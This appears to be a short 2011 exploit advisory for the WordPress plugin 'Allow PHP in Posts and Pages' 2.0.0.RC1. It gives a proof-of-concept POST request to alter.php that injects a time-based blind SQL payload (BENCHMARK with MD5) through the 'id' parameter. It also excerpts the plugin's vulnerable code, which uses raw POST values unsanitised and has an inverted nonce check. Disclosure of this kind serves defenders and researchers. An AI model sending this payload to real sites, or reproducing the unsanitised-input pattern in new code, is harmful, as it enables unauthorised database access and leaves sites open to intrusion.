# Date: 2011-08-18
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 2.0.0.RC1 (tested)
 
---------------
PoC (POST data)
---------------
http://www.site.com/wp-content/plugins/allow-php-in-posts-and-pages/alter.php
 allowPHPNonce=-1&action=modify&function=-1&id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
 
---------------
Vulnerable code
---------------
    if(!isset($_POST[&#039;allowPHPNonce&#039;])){
        if ( !wp_verify_nonce( $_POST[&#039;allowPHPNonce&#039;], plugin_basename(__FILE__) )) {header("location:".$refer);}
    }
    else{
        if(!isset($_POST[&#039;action&#039;]) || !defined (&#039;ABSPATH&#039;)){header("location:".$refer);}
        if(isset($_POST[&#039;id&#039;])){$id = $_POST[&#039;id&#039;];}else{$id=&#039;0&#039;;}
        if(isset($_POST[&#039;function&#039;])){$function = $_POST[&#039;function&#039;];}else{$function="";}
        if(isset($_POST[&#039;name&#039;])){$name = $_POST[&#039;name&#039;];}else{$name="";}
        $action = $_POST[&#039;action&#039;];
 
        #delete
        if($action == "delete"){
 
        ...
 
        elseif($action == "modify" && $function != ""){



